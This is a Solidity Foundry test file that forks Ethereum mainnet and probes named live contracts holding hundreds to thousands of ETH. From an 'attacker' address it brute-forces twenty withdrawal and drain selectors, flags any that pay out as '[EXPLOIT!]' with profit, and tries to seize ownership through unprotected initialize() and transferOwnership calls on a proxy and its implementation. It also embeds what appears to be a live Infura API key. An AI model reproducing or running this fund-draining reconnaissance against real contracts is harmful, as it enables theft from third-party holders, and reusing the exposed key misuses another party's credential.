// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

/**
 * @title Deep Contract Analysis
 * @notice Analyzing specific high-value targets in detail
 */

contract DeepContractAnalysisTest is Test {
    address attacker;
    string rpc = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";

    function setUp() public {
        vm.createSelectFork(rpc);
        attacker = makeAddr("attacker");
    }

    /**
     * @notice Analyze the 11,539 ETH contract at 0x5efc9D10E42FB517456f4ac41EB5e2eBe42C8918
     * Code size: 2739 bytes
     * No owner() function found
     */
    function testAnalyze11kETHContract() public {
        address target = 0x5efc9D10E42FB517456f4ac41EB5e2eBe42C8918;

        console.log("=== DEEP ANALYSIS: 11,539 ETH CONTRACT ===");
        console.log("Target:", target);
        console.log("ETH Balance:", target.balance / 1e18);
        console.log("Code size:", target.code.length);

        // Read extensive storage
        console.log("");
        console.log("[Storage Analysis - 20 slots]");
        for (uint i = 0; i < 20; i++) {
            bytes32 slot = vm.load(target, bytes32(i));
            if (uint256(slot) != 0) {
                console.log("Slot", i, ":", uint256(slot));

                address asAddr = address(uint160(uint256(slot)));
                if (asAddr != address(0) && asAddr.code.length > 0) {
                    console.log("  -> Contract:", asAddr);
                }
            }
        }

        // Try many view function signatures
        console.log("");
        console.log("[Function Discovery]");

        _tryCall(target, "owner()");
        _tryCall(target, "admin()");
        _tryCall(target, "governance()");
        _tryCall(target, "controller()");
        _tryCall(target, "manager()");
        _tryCall(target, "guardian()");
        _tryCall(target, "operator()");
        _tryCall(target, "vault()");
        _tryCall(target, "pool()");
        _tryCall(target, "token()");
        _tryCall(target, "factory()");
        _tryCall(target, "router()");
        _tryCall(target, "totalSupply()");
        _tryCall(target, "balanceOf(address)");
        _tryCall(target, "name()");
        _tryCall(target, "symbol()");
        _tryCall(target, "decimals()");
        _tryCall(target, "getReserves()");
        _tryCall(target, "token0()");
        _tryCall(target, "token1()");
        _tryCall(target, "fee()");
        _tryCall(target, "pendingOwner()");
        _tryCall(target, "paused()");
        _tryCall(target, "initialized()");

        // Brute force common withdrawal functions
        console.log("");
        console.log("[Withdrawal Attempts]");
        vm.startPrank(attacker);
        uint256 balBefore = attacker.balance;

        bytes4[] memory sigs = new bytes4[](20);
        sigs[0] = bytes4(keccak256("withdraw()"));
        sigs[1] = bytes4(keccak256("withdraw(uint256)"));
        sigs[2] = bytes4(keccak256("withdrawAll()"));
        sigs[3] = bytes4(keccak256("withdrawETH()"));
        sigs[4] = bytes4(keccak256("withdrawETH(uint256)"));
        sigs[5] = bytes4(keccak256("claim()"));
        sigs[6] = bytes4(keccak256("claimReward()"));
        sigs[7] = bytes4(keccak256("exit()"));
        sigs[8] = bytes4(keccak256("emergencyWithdraw()"));
        sigs[9] = bytes4(keccak256("rescue()"));
        sigs[10] = bytes4(keccak256("drain()"));
        sigs[11] = bytes4(keccak256("sweep()"));
        sigs[12] = bytes4(keccak256("collect()"));
        sigs[13] = bytes4(keccak256("redeem()"));
        sigs[14] = bytes4(keccak256("redeem(uint256)"));
        sigs[15] = bytes4(keccak256("getReward()"));
        sigs[16] = bytes4(keccak256("claimAll()"));
        sigs[17] = bytes4(keccak256("withdrawTo(address)"));
        sigs[18] = bytes4(keccak256("execute()"));
        sigs[19] = bytes4(keccak256("call(bytes)"));

        for (uint i = 0; i < sigs.length; i++) {
            (bool success,) = target.call(abi.encodeWithSelector(sigs[i]));
            if (success && attacker.balance > balBefore) {
                console.log("[EXPLOIT!] Selector worked:", vm.toString(sigs[i]));
                console.log("Profit:", (attacker.balance - balBefore) / 1e18, "ETH");
            }

            // Also try with amount parameter
            (bool s2,) = target.call(abi.encodeWithSelector(sigs[i], target.balance));
            if (s2 && attacker.balance > balBefore) {
                console.log("[EXPLOIT!] Selector with amount:", vm.toString(sigs[i]));
                console.log("Profit:", (attacker.balance - balBefore) / 1e18, "ETH");
            }
        }

        vm.stopPrank();

        // Check bytecode for function selectors
        console.log("");
        console.log("[Bytecode Analysis]");
        bytes memory code = target.code;
        console.log("First 100 bytes of code:");
        // Just show code exists - can't easily print bytes
    }

    /**
     * @notice Analyze the proxy implementation at 0xe03e12f83aBA2E6b955F96b5acf64082BB8AC162
     * Used by:
     * - 0xdD276dc5223d0120F9BF1776F38957CC8DA23Cb0 (800 ETH)
     * - 0x1B14376ee2d46aE5c27A43D902d96D4F3F264B83 (400 ETH)
     */
    function testAnalyzeProxyImplementation() public {
        address impl = 0xe03e12f83aBA2E6b955F96b5acf64082BB8AC162;
        address proxy1 = 0xdD276dc5223d0120F9BF1776F38957CC8DA23Cb0;
        address proxy2 = 0x1B14376ee2d46aE5c27A43D902d96D4F3F264B83;

        console.log("=== ANALYZING PROXY IMPLEMENTATION ===");
        console.log("Implementation:", impl);
        console.log("Impl code size:", impl.code.length);
        console.log("Proxy 1:", proxy1, "ETH:", proxy1.balance / 1e18);
        console.log("Proxy 2:", proxy2, "ETH:", proxy2.balance / 1e18);
        console.log("Total at risk:", (proxy1.balance + proxy2.balance) / 1e18, "ETH");

        // Analyze implementation storage
        console.log("");
        console.log("[Implementation Storage]");
        for (uint i = 0; i < 10; i++) {
            bytes32 slot = vm.load(impl, bytes32(i));
            if (uint256(slot) != 0) {
                console.log("Slot", i, ":", uint256(slot));
            }
        }

        // Try to find functions on implementation
        console.log("");
        console.log("[Implementation Functions]");
        _tryCall(impl, "owner()");
        _tryCall(impl, "admin()");
        _tryCall(impl, "initialized()");
        _tryCall(impl, "pendingOwner()");

        // Try to initialize implementation directly
        console.log("");
        console.log("[Initialization Attempts on Implementation]");
        vm.startPrank(attacker);

        (bool s1,) = impl.call(abi.encodeWithSignature("initialize()"));
        console.log("initialize():", s1 ? "SUCCESS" : "failed");

        (bool s2,) = impl.call(abi.encodeWithSignature("initialize(address)", attacker));
        console.log("initialize(address):", s2 ? "SUCCESS" : "failed");

        (bool s3,) = impl.call(abi.encodeWithSignature("initialize(address,address)", attacker, attacker));
        console.log("initialize(a,a):", s3 ? "SUCCESS" : "failed");

        // Check if we became owner
        if (s1 || s2 || s3) {
            (bool ownerSuccess, bytes memory ownerData) = impl.staticcall(abi.encodeWithSignature("owner()"));
            if (ownerSuccess && ownerData.length >= 32) {
                address owner = abi.decode(ownerData, (address));
                console.log("New owner:", owner);
                if (owner == attacker) {
                    console.log("[CRITICAL] Attacker is now owner of implementation!");
                }
            }
        }

        vm.stopPrank();

        // Try privileged calls through proxy
        console.log("");
        console.log("[Privilege Escalation through Proxy]");
        vm.startPrank(attacker);

        (bool p1,) = proxy1.call(abi.encodeWithSignature("transferOwnership(address)", attacker));
        console.log("Proxy1 transferOwnership:", p1 ? "SUCCESS!!!" : "blocked");

        (bool p2,) = proxy1.call(abi.encodeWithSignature("withdraw()"));
        console.log("Proxy1 withdraw():", p2 ? "check profit" : "blocked");

        (bool p3,) = proxy1.call(abi.encodeWithSignature("initialize(address)", attacker));
        console.log("Proxy1 initialize(address):", p3 ? "SUCCESS!!!" : "blocked");

        vm.stopPrank();
    }

    /**
     * @notice Analyze the 621 ETH contract with EOA owner
     */
    function testAnalyze621ETHContract() public {
        address target = 0x446B86A33E2a438f569B15855189e3dA28d027ba;

        console.log("=== ANALYZING 621 ETH CONTRACT ===");
        console.log("Target:", target);
        console.log("ETH Balance:", target.balance / 1e18);
        console.log("Code size:", target.code.length);

        // Check owner
        (bool s1, bytes memory d1) = target.staticcall(abi.encodeWithSignature("owner()"));
        if (s1 && d1.length >= 32) {
            address owner = abi.decode(d1, (address));
            console.log("Owner:", owner);
            console.log("Owner is EOA:", owner.code.length == 0);

            // Check owner's balance and transaction count
            console.log("Owner ETH balance:", owner.balance / 1e18);
        }

        // Storage analysis
        console.log("");
        console.log("[Storage]");
        for (uint i = 0; i < 10; i++) {
            bytes32 slot = vm.load(target, bytes32(i));
            if (uint256(slot) != 0) {
                console.log("Slot", i, ":", uint256(slot));
            }
        }

        // Function discovery
        console.log("");
        console.log("[Functions]");
        _tryCall(target, "pendingOwner()");
        _tryCall(target, "initialized()");
        _tryCall(target, "paused()");
        _tryCall(target, "name()");
        _tryCall(target, "symbol()");
    }

    function _tryCall(address target, string memory sig) internal view {
        (bool success, bytes memory data) = target.staticcall(abi.encodeWithSignature(sig));
        if (success && data.length > 0) {
            if (data.length == 32) {
                // Try to decode as uint256 first
                uint256 val = abi.decode(data, (uint256));
                if (val < type(uint160).max && val > 100) {
                    // Might be address
                    address addr = address(uint160(val));
                    if (addr.code.length > 0 || addr != address(0)) {
                        console.log(sig, "-> addr:", addr);
                    } else {
                        console.log(sig, "->", val);
                    }
                } else {
                    console.log(sig, "->", val);
                }
            } else if (data.length == 1) {
                bool b = abi.decode(data, (bool));
                console.log(sig, "->", b);
            } else {
                console.log(sig, "-> (complex return)");
            }
        }
    }

    receive() external payable {}
}
